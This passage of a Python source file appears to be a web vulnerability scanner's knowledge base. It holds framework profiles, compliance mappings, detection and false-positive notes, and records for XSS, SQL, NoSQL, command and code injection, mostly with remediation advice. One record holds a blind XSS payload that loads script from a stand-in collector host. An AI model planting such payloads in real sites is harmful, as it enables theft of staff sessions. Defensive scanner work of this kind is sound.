        default_endpoints=["/admin/", "/admin/api/", "/checkouts/"],
    ),
    "Strapi": FrameworkProfile(
        name="Strapi", language="JavaScript/Node.js", category="api",
        common_vulnerabilities=["BOLA-001", "MASSASSIGN-001", "AUTH-001", "CORS-001", "INFODISC-001"],
        recommendations=["Restrict /api/ routes with Strapi's role/permission system.", "Disable the /admin registration endpoint in production if not needed.", "Set a strong JWT secret."],
        detection_hints=["/admin/init endpoint accessible", "Strapi error format in responses"],
        fingerprinting=["/admin/init", "Strapi", "strapi.io"],
        common_files=["config/server.js", "config/database.js", ".env"],
        default_endpoints=["/admin/", "/api/", "/admin/init"],
    ),
    "GraphQL": FrameworkProfile(
        name="GraphQL", language="any", category="api",
        common_vulnerabilities=["GRAPHQL-001", "BOLA-001", "INFODISC-001", "SQLI-001", "SSRF-001"],
        recommendations=[
            "Disable introspection in production.",
            "Implement query depth and complexity limits.",
            "Apply per-resolver authorization checks.",
        ],
        detection_hints=["/graphql endpoint returns 200 to POST with Content-Type application/json", "Introspection query response exposes schema"],
        fingerprinting=["/graphql", "/api/graphql", "__schema in response", "graphiql interface"],
        common_files=[],
        default_endpoints=["/graphql", "/api/graphql", "/graphiql", "/playground"],
    ),
    "gRPC": FrameworkProfile(
        name="gRPC", language="any", category="api",
        common_vulnerabilities=["GRPC-001", "BOLA-001", "INFODISC-001", "DESER-001"],
        recommendations=["Disable server reflection in production.", "Require per-call auth metadata.", "Apply per-method interceptors for authorization."],
        detection_hints=["Content-Type: application/grpc responses", "grpc-status header"],
        fingerprinting=["application/grpc", "grpc-status header", "grpc-message header"],
        common_files=["*.proto", "proto/"],
        default_endpoints=["/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo"],
    ),
}


# ======================================================================
# COMPLIANCE MAPPING TEMPLATES  (by Category)
# ======================================================================

_COMPLIANCE_BY_CATEGORY: dict[Category, ComplianceMapping] = {
    Category.INJECTION: ComplianceMapping(
        pci_dss=["6.2.4", "6.3.1"], soc2=["CC6.1", "CC6.7"],
        iso27001=["A.8.28", "A.8.9"], hipaa=["164.312(a)(2)(iv)"],
        gdpr=["Art. 25", "Art. 32"], owasp_asvs=["V5.3.4", "V5.3.5"],
    ),
    Category.XSS: ComplianceMapping(
        pci_dss=["6.2.4"], soc2=["CC6.1"], iso27001=["A.8.28"],
        hipaa=["164.312(b)"], gdpr=["Art. 32"], owasp_asvs=["V5.3.1", "V5.3.3"],
    ),
    Category.AUTH: ComplianceMapping(
        pci_dss=["8.2.1", "8.3.1", "8.6.1"], soc2=["CC6.1", "CC6.2", "CC6.3"],
        iso27001=["A.8.5", "A.8.6"], hipaa=["164.312(d)"],
        gdpr=["Art. 25", "Art. 32"], owasp_asvs=["V2.1.1", "V2.2.1", "V3.1.1"],
    ),
    Category.ACCESS_CONTROL: ComplianceMapping(
        pci_dss=["7.2.1", "7.2.2"], soc2=["CC6.1", "CC6.3"],
        iso27001=["A.8.3", "A.8.4"], hipaa=["164.312(a)(1)"],
        gdpr=["Art. 25", "Art. 32"], owasp_asvs=["V4.1.1", "V4.1.2", "V4.2.1"],
    ),
    Category.CRYPTO: ComplianceMapping(
        pci_dss=["4.2.1", "6.2.4"], soc2=["CC6.1", "CC6.7"],
        iso27001=["A.8.24"], hipaa=["164.312(a)(2)(iv)", "164.312(e)(2)(ii)"],
        gdpr=["Art. 32"], owasp_asvs=["V6.1.1", "V6.2.1", "V6.3.1"],
    ),
    Category.CONFIGURATION: ComplianceMapping(
        pci_dss=["2.2.1", "6.3.3"], soc2=["CC6.1", "CC7.1"],
        iso27001=["A.8.8", "A.8.9"], hipaa=["164.312(b)"],
        gdpr=["Art. 25", "Art. 32"], owasp_asvs=["V14.1.1", "V14.2.1"],
    ),
    Category.XXE: ComplianceMapping(
        pci_dss=["6.2.4"], soc2=["CC6.1"], iso27001=["A.8.28"],
        hipaa=["164.312(b)"], gdpr=["Art. 32"], owasp_asvs=["V5.5.2"],
    ),
    Category.SSRF: ComplianceMapping(
        pci_dss=["6.2.4", "1.3.2"], soc2=["CC6.1", "CC6.6"],
        iso27001=["A.8.28"], hipaa=["164.312(b)"],
        gdpr=["Art. 32"], owasp_asvs=["V5.2.6"],
    ),
    Category.FILE_HANDLING: ComplianceMapping(
        pci_dss=["6.2.4"], soc2=["CC6.1"],
        iso27001=["A.8.28", "A.8.10"], hipaa=["164.312(b)"],
        gdpr=["Art. 32"], owasp_asvs=["V12.1.1", "V12.2.1"],
    ),
    Category.BUSINESS_LOGIC: ComplianceMapping(
        pci_dss=["6.2.4"], soc2=["CC6.1"], iso27001=["A.8.28"],
        hipaa=["164.312(b)"], gdpr=["Art. 32"], owasp_asvs=["V4.2.2", "V15.1.1"],
    ),
    Category.API_SECURITY: ComplianceMapping(
        pci_dss=["6.2.4", "6.3.1"], soc2=["CC6.1", "CC6.6"],
        iso27001=["A.8.28"], hipaa=["164.312(b)"],
        gdpr=["Art. 25", "Art. 32"], owasp_asvs=["V4.2.1", "V13.1.1", "V13.2.1"],
    ),
    Category.INFO_DISCLOSURE: ComplianceMapping(
        pci_dss=["6.2.4", "6.3.3"], soc2=["CC6.1"],
        iso27001=["A.8.2", "A.8.10"], hipaa=["164.312(b)"],
        gdpr=["Art. 5", "Art. 32"], owasp_asvs=["V8.3.1", "V14.3.1"],
    ),
    Category.CLIENT_SIDE: ComplianceMapping(
        pci_dss=["6.2.4"], soc2=["CC6.1"], iso27001=["A.8.28"],
        hipaa=["164.312(b)"], gdpr=["Art. 32"], owasp_asvs=["V5.3.1", "V14.5.1"],
    ),
    Category.CLOUD: ComplianceMapping(
        pci_dss=["1.3.2", "2.2.1", "7.2.1"], soc2=["CC6.1", "CC6.3", "CC7.1"],
        iso27001=["A.8.9", "A.8.23"], hipaa=["164.312(a)(1)"],
        gdpr=["Art. 25", "Art. 32"], owasp_asvs=["V14.1.1"],
    ),
    Category.SUPPLY_CHAIN: ComplianceMapping(
        pci_dss=["6.3.2", "12.3.2"], soc2=["CC9.2"],
        iso27001=["A.8.30", "A.5.21"], hipaa=["164.308(b)(1)"],
        gdpr=["Art. 28", "Art. 32"], owasp_asvs=["V14.2.1"],
    ),
    Category.NETWORK_SERVICE: ComplianceMapping(
        pci_dss=["1.3.1", "2.2.1"], soc2=["CC6.1", "CC6.6"],
        iso27001=["A.8.20", "A.8.21"], hipaa=["164.312(a)(1)"],
        gdpr=["Art. 32"], owasp_asvs=["V14.1.1"],
    ),
    Category.DESERIALIZATION: ComplianceMapping(
        pci_dss=["6.2.4"], soc2=["CC6.1"], iso27001=["A.8.28"],
        hipaa=["164.312(b)"], gdpr=["Art. 32"], owasp_asvs=["V5.5.1"],
    ),
}

# ======================================================================
# EXPLOITATION INTELLIGENCE TEMPLATES
# ======================================================================

_EXPLOIT_INTEL_BY_EXPLOITABILITY: dict[Exploitability, ExploitationIntelligence] = {
    Exploitability.TRIVIAL: ExploitationIntelligence(
        difficulty="Trivial",
        prerequisites=["Network access to the target"],
        authentication_required=False, privilege_required="None", user_interaction=False,
        exploit_chain=[],
        post_exploitation=["Establish persistence", "Lateral movement", "Data exfiltration"],
    ),
    Exploitability.EASY: ExploitationIntelligence(
        difficulty="Easy",
        prerequisites=["Network access to the target", "Basic HTTP tooling (curl/Burp)"],
        authentication_required=False, privilege_required="None", user_interaction=False,
        post_exploitation=["Data collection", "Privilege escalation attempt"],
    ),
    Exploitability.MODERATE: ExploitationIntelligence(
        difficulty="Moderate",
        prerequisites=["Network access", "Understanding of the target technology stack"],
        authentication_required=False, privilege_required="None", user_interaction=False,
        post_exploitation=["Enumerate accessible resources", "Chain with other findings"],
    ),
    Exploitability.DIFFICULT: ExploitationIntelligence(
        difficulty="Difficult",
        prerequisites=["Network access", "Target-specific knowledge", "Specialised tooling"],
        authentication_required=False, privilege_required="None", user_interaction=False,
        post_exploitation=["Limited — contextual to specific vulnerability"],
    ),
    Exploitability.THEORETICAL: ExploitationIntelligence(
        difficulty="Theoretical",
        prerequisites=["Highly specific conditions must be met simultaneously"],
        authentication_required=False, privilege_required="None", user_interaction=True,
        post_exploitation=["Minimal standalone impact"],
    ),
}

# ======================================================================
# BOILERPLATE TEMPLATE GENERATORS
# ======================================================================

_FRAMEWORK_NOTES: dict[Category, str] = {
    Category.INJECTION: (
        "Observed across raw SQL/ORM query builders, template engines, and shell-invoking code "
        "in PHP, Node.js/Express, Python/Flask/Django, Java/Spring, and Ruby on Rails "
        "when user input reaches an interpreter without parameterisation or escaping."
    ),
    Category.XSS: (
        "Common in server-rendered templates (Jinja2, ERB, JSP, Blade) that auto-escaping "
        "was disabled for, and in SPA frameworks (React, Vue, Angular) when "
        "dangerouslySetInnerHTML/v-html/innerHTML is used with untrusted data."
    ),
    Category.AUTH: (
        "Frequently rooted in custom-built authentication layers, older sessions middleware, "
        "or JWT libraries misconfigured to accept attacker-controlled algorithm/key parameters."
    ),
    Category.ACCESS_CONTROL: (
        "Typically arises when authorization checks are enforced only in the UI layer or "
        "a single controller, and are missing from underlying API routes, background jobs, "
        "or GraphQL resolvers."
    ),
    Category.CRYPTO: (
        "Seen where legacy cipher suites, deprecated hashing functions, or language-default "
        "insecure random generators (e.g. Python `random`, Java `Random`) are used for "
        "security-sensitive operations."
    ),
    Category.CONFIGURATION: (
        "Usually a result of default settings shipped by frameworks (Django DEBUG=True, "
        "Spring Actuator exposed, default admin credentials) being carried into production."
    ),
    Category.XXE: (
        "Affects XML parsers (libxml2, Java DocumentBuilderFactory, .NET XmlDocument) "
        "that have external entity resolution and DTD processing enabled by default."
    ),
    Category.SSRF: (
        "Common in URL-fetching features (webhooks, image proxies, PDF generators, link "
        "previews) that do not validate destination host against an allowlist and follow "
        "redirects blindly."
    ),
    Category.FILE_HANDLING: (
        "Arises in file upload handlers that trust client-supplied extensions/MIME types "
        "and store files inside the web root, or in archive extraction code vulnerable "
        "to path traversal."
    ),
    Category.BUSINESS_LOGIC: (
        "Specific to the application's own workflow assumptions (checkout, coupons, "
        "multi-step approval, referral systems) rather than a generic technical flaw, "
        "so automated scanners rarely catch it."
    ),
    Category.API_SECURITY: (
        "Predominantly found in REST and GraphQL APIs where object-level authorization, "
        "rate limiting, and response field filtering are delegated to the client rather "
        "than enforced server-side."
    ),
    Category.INFO_DISCLOSURE: (
        "Surfaces through verbose error pages, exposed metadata endpoints, source maps, "
        "or misconfigured cloud storage left publicly readable."
    ),
    Category.CLIENT_SIDE: (
        "Relevant to browser security model interactions: framing, window referencing, "
        "postMessage handlers, and third-party script inclusion."
    ),
    Category.CLOUD: (
        "Tied to cloud provider defaults (AWS S3/IAM, GCP Firebase, Azure Blob) and "
        "container/orchestration platform APIs (Docker, Kubernetes) left reachable "
        "without authentication."
    ),
    Category.SUPPLY_CHAIN: (
        "Related to third-party dependencies, CI/CD pipelines, and exposed "
        "version-control artefacts that leak build or credential material."
    ),
    Category.NETWORK_SERVICE: (
        "Concerns backing services (Redis, MongoDB, Elasticsearch, Memcached, SMTP, FTP, "
        "SNMP) reachable on the network without authentication, often bound to 0.0.0.0 "
        "in container deployments."
    ),
    Category.DESERIALIZATION: (
        "Affects native serialization formats (Java ObjectInputStream, PHP unserialize, "
        "Python pickle, .NET BinaryFormatter/ViewState) when fed attacker-controlled "
        "byte streams."
    ),
}

_BUSINESS_IMPACT_BY_SEVERITY: dict[Severity, str] = {
    Severity.CRITICAL: (
        "Realistic worst case is full compromise of the application, underlying host, "
        "or customer data set, with associated breach notification, regulatory, and "
        "reputational costs."
    ),
    Severity.HIGH: (
        "Realistic worst case is significant unauthorized access to sensitive data or "
        "account takeover affecting a subset of users, with material remediation and "
        "disclosure overhead."
    ),
    Severity.MEDIUM: (
        "Realistic worst case is limited data exposure or a foothold that requires "
        "chaining with another weakness to cause serious harm."
    ),
    Severity.LOW: (
        "Realistic worst case is minor information leakage or a usability degradation "
        "with limited direct business impact on its own."
    ),
    Severity.INFO: (
        "No direct exploitable impact by itself; recorded to support defence-in-depth "
        "hardening and attack surface reduction."
    ),
}

_FALSE_POSITIVE_NOTES: dict[Category, str] = {
    Category.INJECTION: (
        "Confirm the payload actually altered query/command logic (timing delta, "
        "differential response, or out-of-band callback) rather than relying on "
        "error-message pattern matching alone, which WAFs often rewrite."
    ),
    Category.XSS: (
        "Verify the payload executes in an unescaped HTML/JS/attribute context via "
        "headless browser confirmation; reflected input that is HTML-entity encoded "
        "on output is not exploitable."
    ),
    Category.AUTH: "Rule out intentional guest/demo accounts and confirm the weakness is reachable without prior authentication where claimed.",
    Category.ACCESS_CONTROL: "Confirm the second account genuinely lacks a legitimate relationship to the resource; shared-tenant demo data can look like an IDOR when it is intentionally public.",
    Category.CRYPTO: "Confirm the weak primitive is actually used for a security-relevant purpose (e.g. token generation) and not for non-sensitive cache keys.",
    Category.CONFIGURATION: "Confirm the setting is present in the production environment, not only in a staging/dev instance that is intentionally permissive.",
    Category.XXE: "Confirm entity expansion is reflected or triggers an out-of-band request; many modern parsers disable DTD processing by default and will silently ignore the payload.",
    Category.SSRF: "Confirm via an out-of-band interaction (DNS/HTTP callback to a controlled collaborator) rather than assuming a timing difference proves the request was made server-side.",
    Category.FILE_HANDLING: "Confirm the uploaded file is actually stored and served with executable permissions/content-type, not just accepted at the validation layer.",
    Category.BUSINESS_LOGIC: "Reproduce the full multi-step flow twice to rule out a one-off environment glitch before reporting.",
    Category.API_SECURITY: "Confirm the object ID belongs to a different tenant/user account created specifically for the test, not shared fixture data.",
    Category.INFO_DISCLOSURE: "Confirm the disclosed data is sensitive and not already intentionally public (e.g. public API documentation).",
    Category.CLIENT_SIDE: "Confirm the issue is reachable from a real third-party origin and not mitigated by an existing CSP or framing directive further up the response chain.",
    Category.CLOUD: "Confirm anonymous/unauthenticated access is possible from outside the cloud provider's own network, not only from within a VPC test harness.",
    Category.SUPPLY_CHAIN: "Confirm the exposed artefact contains live, non-rotated credentials rather than placeholder or already-revoked values.",
    Category.NETWORK_SERVICE: "Confirm the service is reachable from outside the intended network segment and not an internal-only bastion finding.",
    Category.DESERIALIZATION: "Confirm actual gadget-chain execution (e.g. callback, sleep) rather than only a deserialization exception, which can occur harmlessly on malformed input.",
}

_DETECTION_NOTES: dict[Category, str] = {
    Category.INJECTION: "Differential/time-based response analysis plus out-of-band interaction (DNS/HTTP) callbacks.",
    Category.XSS: "Headless browser DOM/console verification of payload execution across reflected, stored, and DOM sinks.",
    Category.AUTH: "Session/token replay testing across privilege boundaries and after logout/expiry.",
    Category.ACCESS_CONTROL: "Cross-account object ID substitution (BOLA/IDOR matrix) using two distinct authenticated sessions.",
    Category.CRYPTO: "Static analysis of key/IV generation and cipher/hash selection, cross-checked against NIST guidance.",
    Category.CONFIGURATION: "Passive fingerprinting of headers/banners plus targeted requests to well-known management paths.",
    Category.XXE: "Out-of-band DNS/HTTP interaction via crafted external entity, since in-band reflection is often disabled.",
    Category.SSRF: "Out-of-band collaborator callback triggered from server-side fetch functionality.",
    Category.FILE_HANDLING: "Upload-then-fetch verification confirming stored file executes or is served as attacker-chosen content-type.",
    Category.BUSINESS_LOGIC: "Manual, workflow-aware testing; not detectable by signature-based automated scanning.",
    Category.API_SECURITY: "Automated matrix testing of endpoints against multiple authenticated identities and roles.",
    Category.INFO_DISCLOSURE: "Passive content and metadata review of responses, headers, and exposed files/endpoints.",
    Category.CLIENT_SIDE: "Manual browser-based verification of framing, window handle, and postMessage origin checks.",
    Category.CLOUD: "Unauthenticated API/console probing of cloud and container management surfaces from the public internet.",
    Category.SUPPLY_CHAIN: "OSINT and repository/history scraping for committed secrets and build artefacts.",
    Category.NETWORK_SERVICE: "Unauthenticated protocol-level connection attempt and banner/command verification.",
    Category.DESERIALIZATION: "Gadget-chain proof-of-concept triggering an observable side effect (sleep, callback, file write).",
}

_FRAMEWORKS_BY_CATEGORY: dict[Category, list[str]] = {
    Category.INJECTION: ["Laravel", "Django", "Rails", "Spring Boot", "Express", "CodeIgniter", "Yii"],
    Category.XSS: ["React", "Vue", "Angular", "Next.js", "Nuxt", "WordPress", "Django"],
    Category.AUTH: ["Flask", "Express", "NestJS", "Spring Boot", "ASP.NET", "Rails", "Laravel"],
    Category.ACCESS_CONTROL: ["FastAPI", "NestJS", "Spring Boot", "Express", "Django", "Strapi"],
    Category.CRYPTO: ["ASP.NET", "Spring Boot", "Laravel", "Rails", "Django"],
    Category.CONFIGURATION: ["Django", "Flask", "Spring Boot", "ASP.NET", "WordPress", "Drupal", "Magento"],
    Category.XXE: ["Spring", "ASP.NET", "Laravel", "Symfony", "Rails"],
    Category.SSRF: ["Laravel", "Next.js", "Flask", "Express", "Spring Boot"],
    Category.FILE_HANDLING: ["WordPress", "Drupal", "Laravel", "CodeIgniter", "Magento"],
    Category.BUSINESS_LOGIC: ["Shopify", "Magento", "WordPress", "Strapi"],
    Category.API_SECURITY: ["FastAPI", "NestJS", "Express", "GraphQL", "gRPC", "Strapi", "Spring Boot"],
    Category.INFO_DISCLOSURE: ["Django", "Flask", "Spring Boot", "ASP.NET", "WordPress"],
    Category.CLIENT_SIDE: ["React", "Vue", "Angular", "Next.js", "Nuxt"],
    Category.CLOUD: ["Express", "Flask", "Spring Boot", "FastAPI"],
    Category.SUPPLY_CHAIN: ["WordPress", "Drupal", "Magento", "Express", "Laravel"],
    Category.NETWORK_SERVICE: ["Spring Boot", "Express", "Flask"],
    Category.DESERIALIZATION: ["Spring", "ASP.NET", "Rails", "Laravel"],
}

# ---- positive/negative detection indicators per category ----
_POS_INDICATORS: dict[Category, list[str]] = {
    Category.INJECTION: ["Differential response length/content", "Time delay > 4 s on sleep payload", "Out-of-band DNS/HTTP callback received"],
    Category.XSS: ["JavaScript alert/console.log fires in headless browser", "DOM modification confirmed via Playwright"],
    Category.AUTH: ["Login succeeds with crafted/invalid credential", "Elevated role visible in response after bypass"],
    Category.ACCESS_CONTROL: ["Response body contains another user's data", "Object ID substitution returns 200 with foreign data"],
    Category.CRYPTO: ["Algorithm identifier 'MD5'/'DES'/'RC4' in source/traffic", "Token entropy below 64 bits"],
    Category.CONFIGURATION: ["HTTP response contains debug/stack-trace content", "Management endpoint returns 200 unauthenticated"],
    Category.XXE: ["Out-of-band HTTP/DNS callback from parser", "File content reflected in response"],
    Category.SSRF: ["Out-of-band callback from application to controlled server", "Internal service banner in response"],
    Category.FILE_HANDLING: ["Uploaded file served with executable content-type", "Web shell command executes"],
    Category.BUSINESS_LOGIC: ["Financial value or limit bypassed in application state"],
    Category.API_SECURITY: ["Foreign user data returned for substituted object ID"],
    Category.INFO_DISCLOSURE: ["Stack trace or internal path in HTTP response"],
    Category.CLIENT_SIDE: ["iframe loads target origin without frame-ancestors restriction"],
    Category.CLOUD: ["Cloud metadata response body received (169.254.169.254)"],
    Category.SUPPLY_CHAIN: ["Secret value functional when tested against target API"],
    Category.NETWORK_SERVICE: ["Service banner/prompt received on unauthenticated connection"],
    Category.DESERIALIZATION: ["Time delay or callback from gadget-chain execution"],
}

_NEG_INDICATORS: dict[Category, list[str]] = {
    Category.INJECTION: ["WAF block page returned (not genuine logic change)", "Input reflected but query not altered"],
    Category.XSS: ["Input HTML-entity encoded in response", "CSP blocks script execution"],
    Category.AUTH: ["Account is intentionally a guest/demo account"],
    Category.ACCESS_CONTROL: ["Resource is intentionally shared/public"],
    Category.CRYPTO: ["Weak hash used only for non-security-relevant cache key"],
    Category.CONFIGURATION: ["Endpoint is staging/dev environment only"],
    Category.XXE: ["Parser has DTD/entity expansion disabled by default"],
    Category.SSRF: ["Timeout only — no confirmed out-of-band callback"],
    Category.FILE_HANDLING: ["File accepted but not stored in executable location"],
    Category.BUSINESS_LOGIC: ["Behaviour is intentional and documented"],
    Category.API_SECURITY: ["Object ID belongs to shared demo dataset"],
    Category.INFO_DISCLOSURE: ["Data is intentionally public documentation"],
    Category.CLIENT_SIDE: ["X-Frame-Options or frame-ancestors CSP already set"],
    Category.CLOUD: ["Access only reachable from within VPC, not public internet"],
    Category.SUPPLY_CHAIN: ["Secret already rotated/revoked"],
    Category.NETWORK_SERVICE: ["Service only reachable on private/management network"],
    Category.DESERIALIZATION: ["Exception on malformed input without gadget-chain execution"],
}


def _framework_notes(cat: Category) -> str:
    return _FRAMEWORK_NOTES.get(cat, "Applicable across common modern web application stacks.")


def _business_impact(sev: Severity) -> str:
    return _BUSINESS_IMPACT_BY_SEVERITY.get(sev, "Impact should be assessed in the context of the affected asset.")


def _fp_notes(cat: Category) -> str:
    return _FALSE_POSITIVE_NOTES.get(cat, "Manually confirm exploitability before including in a final report.")


def _detection_notes(cat: Category) -> str:
    return _DETECTION_NOTES.get(cat, "Manual verification recommended.")


def _affected_frameworks(cat: Category) -> list[str]:
    return list(_FRAMEWORKS_BY_CATEGORY.get(cat, []))


def _compliance(cat: Category) -> ComplianceMapping:
    return _COMPLIANCE_BY_CATEGORY.get(cat, ComplianceMapping())


def _exploit_intel(exploit: Exploitability) -> ExploitationIntelligence:
    return _EXPLOIT_INTEL_BY_EXPLOITABILITY.get(exploit, ExploitationIntelligence())


def _detection_intel(cat: Category) -> DetectionIntelligence:
    return DetectionIntelligence(
        positive_indicators=_POS_INDICATORS.get(cat, []),
        negative_indicators=_NEG_INDICATORS.get(cat, []),
        validation_steps=[
            "Reproduce the finding independently with a clean session.",
            "Confirm impact is not blocked by compensating controls.",
            "Document full request/response evidence.",
        ],
        manual_verification=_detection_notes(cat),
        common_false_positives=[_fp_notes(cat)],
        required_conditions=[],
    )


def _refs(cwe: str, owasp: str, extra: Optional[list[str]] = None) -> list[str]:
    cwe_num = "".join(ch for ch in cwe if ch.isdigit())
    links: list[str] = [
        f"https://cwe.mitre.org/data/definitions/{cwe_num}.html",
        "https://owasp.org/www-project-top-ten/",
    ]
    if extra:
        links.extend(extra)
    return links


# ======================================================================
# RAW VULNERABILITY RECORDS
# ======================================================================

_RAW_VULNERABILITIES: list[dict] = [
    dict(id="XSS-001", title="Reflected Cross-Site Scripting", aliases=["Reflected XSS", "RXSS"],
         category=Category.XSS, severity=Severity.MEDIUM, cvss=6.1, vector="AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
         cwe="CWE-79", owasp="A03:2021-Injection", capec="CAPEC-63", av=AttackVector.NETWORK,
         desc="User-supplied input is echoed back into an HTTP response without adequate output encoding, allowing an attacker to inject client-side script that executes in the victim's browser session via a crafted link.",
         impact="Session token theft, credential harvesting via fake forms, action forgery on behalf of the victim, and defacement of the rendered page.",
         rec="Apply context-aware output encoding (HTML entity, JS string, URL encoding) at the point of output, adopt a strict Content-Security-Policy, and use auto-escaping template engines.",
         tags=["xss","client-side","owasp-top10"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="xss", related=["XSS-002","XSS-003"]),
    dict(id="XSS-002", title="Stored Cross-Site Scripting", aliases=["Persistent XSS","SXSS"],
         category=Category.XSS, severity=Severity.HIGH, cvss=8.8, vector="AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N",
         cwe="CWE-79", owasp="A03:2021-Injection", capec="CAPEC-63", av=AttackVector.NETWORK,
         desc="Attacker-supplied script is persisted server-side (comments, profile fields, support tickets) and rendered unescaped to other users, including potentially privileged administrators.",
         impact="Mass account compromise, administrative session hijack, worm-style propagation across all viewers of the stored content.",
         rec="Sanitise on input using an allowlist HTML sanitiser (e.g. DOMPurify, bleach), encode on output, and enforce CSP with nonce-based script-src.",
         tags=["xss","stored","high-impact"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="xss", related=["XSS-001"]),
    dict(id="XSS-003", title="DOM-Based Cross-Site Scripting", aliases=["DOM XSS"],
         category=Category.XSS, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
         cwe="CWE-79", owasp="A03:2021-Injection", capec="CAPEC-588", av=AttackVector.NETWORK,
         desc="Client-side JavaScript reads attacker-controlled data (location.hash, postMessage, document.referrer) and writes it to a dangerous DOM sink such as innerHTML or eval without sanitisation.",
         impact="Client-side code execution identical to reflected XSS, but invisible to server-side logs and WAFs since the payload never reaches the server.",
         rec="Avoid dangerous sinks (innerHTML, document.write, eval); use textContent/safe DOM APIs, and run a source-to-sink taint analysis in CI.",
         tags=["xss","dom","client-side"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="xss"),
    dict(id="XSS-004", title="Blind Cross-Site Scripting", aliases=["Blind XSS"],
         category=Category.XSS, severity=Severity.HIGH, cvss=7.2, vector="AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
         cwe="CWE-79", owasp="A03:2021-Injection", capec="CAPEC-63", av=AttackVector.NETWORK,
         desc="A stored XSS payload fires in an out-of-band context (support/admin dashboard, log viewer) that the tester cannot directly observe, requiring a callback-based payload to confirm.",
         impact="Compromise of internal/back-office staff sessions which frequently carry elevated privileges.",
         rec="Treat every user-controllable field that may be viewed by internal staff as an XSS sink; sanitise and encode consistently across customer- and staff-facing surfaces.",
         tags=["xss","blind","oob"], confidence="Tentative", exploit=Exploitability.MODERATE, payloads=["<script src=https://xss-collector.example/c.js></script>"]),
    dict(id="SQLI-001", title="Classic SQL Injection (In-Band)", aliases=["SQLi","UNION-based SQLi"],
         category=Category.INJECTION, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-89", owasp="A03:2021-Injection", capec="CAPEC-66", av=AttackVector.NETWORK,
         desc="Unsanitised user input is concatenated directly into a SQL query, allowing UNION-based extraction of arbitrary database contents or direct modification via injected clauses.",
         impact="Full database read/write access, authentication bypass, and potential OS command execution via database stored procedures (e.g. xp_cmdshell).",
         rec="Use parameterised queries/prepared statements exclusively; never build SQL via string concatenation; apply least-privilege database accounts.",
         tags=["sqli","injection","owasp-top10","database"], confidence="Confirmed", exploit=Exploitability.TRIVIAL, payload_key="sqli", related=["SQLI-002","SQLI-003"]),
    dict(id="SQLI-002", title="Blind Boolean-Based SQL Injection", aliases=["Boolean Blind SQLi"],
         category=Category.INJECTION, severity=Severity.HIGH, cvss=8.6, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
         cwe="CWE-89", owasp="A03:2021-Injection", capec="CAPEC-66", av=AttackVector.NETWORK,
         desc="Injected boolean conditions cause observable differences in application response without direct data reflection, enabling bit-by-bit data extraction.",
         impact="Complete database exfiltration achievable via automated tooling (e.g. sqlmap) despite no visible error output.",
         rec="Parameterise all queries; ensure identical error handling for true/false conditions does not leak through response differences.",
         tags=["sqli","blind","injection"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="sqli"),
    dict(id="SQLI-003", title="Time-Based Blind SQL Injection", aliases=["Time-Based SQLi"],
         category=Category.INJECTION, severity=Severity.HIGH, cvss=8.6, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
         cwe="CWE-89", owasp="A03:2021-Injection", capec="CAPEC-66", av=AttackVector.NETWORK,
         desc="Injected time-delay functions (SLEEP, WAITFOR DELAY, pg_sleep) allow inference of query results purely from response latency.",
         impact="Full data exfiltration possible; also usable to fingerprint the backend DBMS.",
         rec="Parameterise queries; monitor for anomalous long-running queries at the database layer.",
         tags=["sqli","blind","time-based"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="sqli"),
    dict(id="SQLI-004", title="NoSQL Injection", aliases=["MongoDB Injection","NoSQLi"],
         category=Category.INJECTION, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-943", owasp="A03:2021-Injection", capec="CAPEC-110", av=AttackVector.NETWORK,
         desc="Operator injection ($ne, $gt, $where) into a NoSQL query lets an attacker alter query logic via JSON body parameters passed unsanitised to a MongoDB/CouchDB driver.",
         impact="Authentication bypass, full collection dump, and in some cases server-side code execution.",
         rec="Cast/validate input types strictly, reject non-scalar values for fields expecting scalars, disable $where where not required.",
         tags=["nosqli","injection","mongodb"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="nosqli"),
    dict(id="CMDI-001", title="OS Command Injection", aliases=["Command Injection","RCE via Command Injection"],
         category=Category.INJECTION, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-78", owasp="A03:2021-Injection", capec="CAPEC-88", av=AttackVector.NETWORK,
         desc="User input is passed to a shell interpreter (system(), exec(), subprocess with shell=True) without sanitisation, allowing arbitrary OS command execution.",
         impact="Full remote code execution as the application user, typically leading to complete host compromise and lateral movement.",
         rec="Avoid shell invocation entirely; use language-native APIs with argument arrays (no shell=True).",
         tags=["rce","command-injection","critical"], confidence="Confirmed", exploit=Exploitability.TRIVIAL, payload_key="command_injection"),
    dict(id="CODEI-001", title="Server-Side Code Injection", aliases=["Code Injection","eval() Injection"],
         category=Category.INJECTION, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-94", owasp="A03:2021-Injection", capec="CAPEC-242", av=AttackVector.NETWORK,
         desc="Untrusted input reaches a dynamic code evaluation function (eval, exec, Function constructor) allowing arbitrary code execution in the application's runtime.",
         impact="Full remote code execution with the privileges of the application process.",
         rec="Never evaluate untrusted input as code; replace dynamic evaluation with safe parsers (ast.literal_eval, JSON) or a restricted expression sandbox.",
         tags=["rce","code-injection","critical"], confidence="Confirmed", exploit=Exploitability.TRIVIAL, payload_key="code_injection"),
    dict(id="SSTI-001", title="Server-Side Template Injection", aliases=["SSTI"],
         category=Category.INJECTION, severity=Severity.CRITICAL, cvss=9.4, vector="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
